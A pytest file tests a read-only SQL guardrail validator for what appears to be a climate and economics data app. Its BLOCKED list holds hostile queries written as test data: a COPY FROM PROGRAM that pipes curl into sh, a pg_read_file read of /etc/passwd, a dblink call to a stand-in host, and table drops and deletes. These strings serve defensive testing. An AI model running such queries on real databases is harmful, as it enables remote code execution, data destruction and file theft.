"""Guardrail unit tests. The validator is pure, so we fuzz it exhaustively."""

from __future__ import annotations

import pytest

from app.infrastructure.sql.validator import SqlValidatorChain


@pytest.fixture
def validator() -> SqlValidatorChain:
    return SqlValidatorChain(row_cap=1000)


ALLOWED = [
    "SELECT country_iso3, co2_per_capita FROM owid_co2 WHERE year = 2022 "
    "ORDER BY co2_per_capita DESC LIMIT 10",
    "SELECT c.name, v.value FROM wdi_values v JOIN countries c ON c.iso3 = v.country_iso3 "
    "WHERE v.indicator_code = 'NY.GDP.PCAP.CD' AND v.year = 2022 ORDER BY v.value DESC LIMIT 5",
    "WITH top AS (SELECT country_iso3 FROM owid_co2 WHERE year = 2022 LIMIT 5) "
    "SELECT * FROM top LIMIT 5",
    "SELECT count(*) FROM countries LIMIT 1",
]

BLOCKED = [
    # writes / DDL
    "INSERT INTO countries (iso3, name) VALUES ('ZZ', 'x')",
    "UPDATE countries SET name = 'x'",
    "DELETE FROM countries",
    "DROP TABLE countries",
    "CREATE TABLE evil (x int)",
    "ALTER TABLE countries ADD COLUMN x int",
    "TRUNCATE TABLE countries",
    "GRANT ALL ON countries TO evil",
    "COPY countries FROM PROGRAM 'curl evil.sh | sh'",
    # data-modifying CTE
    "WITH d AS (DELETE FROM countries RETURNING *) SELECT * FROM d LIMIT 10",
    # stacked statements
    "SELECT 1; DROP TABLE countries",
    "SELECT * FROM countries LIMIT 10; DELETE FROM countries",
    # system catalog / cross-schema
    "SELECT * FROM pg_catalog.pg_tables LIMIT 10",
    "SELECT * FROM information_schema.tables LIMIT 10",
    "SELECT * FROM app.conversations LIMIT 10",
    "SELECT * FROM app.runs LIMIT 10",
    # dangerous functions
    "SELECT pg_sleep(10)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int) LIMIT 1",
    # unknown table (exfiltration target)
    "SELECT * FROM secret_users LIMIT 10",
    # not a query
    "VACUUM",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_valid_read_only_queries_pass(validator: SqlValidatorChain, sql: str) -> None:
    result = validator.validate(sql)
    assert result.ok, result.first_violation


@pytest.mark.parametrize("sql", BLOCKED)
def test_unsafe_queries_are_blocked(validator: SqlValidatorChain, sql: str) -> None:
    result = validator.validate(sql)
    assert not result.ok
    assert result.first_violation is not None


def test_missing_limit_is_injected(validator: SqlValidatorChain) -> None:
    result = validator.validate("SELECT * FROM countries")
    assert result.ok
    assert "LIMIT" in result.sql.upper()


def test_oversized_limit_is_clamped(validator: SqlValidatorChain) -> None:
    result = validator.validate("SELECT * FROM countries LIMIT 999999")
    assert result.ok
    assert "1000" in result.sql
    assert "999999" not in result.sql


def test_unparseable_sql_is_rejected(validator: SqlValidatorChain) -> None:
    result = validator.validate("SELECT FROM WHERE )(")
    assert not result.ok


def test_blocked_result_names_the_rule(validator: SqlValidatorChain) -> None:
    result = validator.validate("DELETE FROM countries")
    assert result.first_violation is not None
    assert result.first_violation.rule == "ReadOnlyRule"
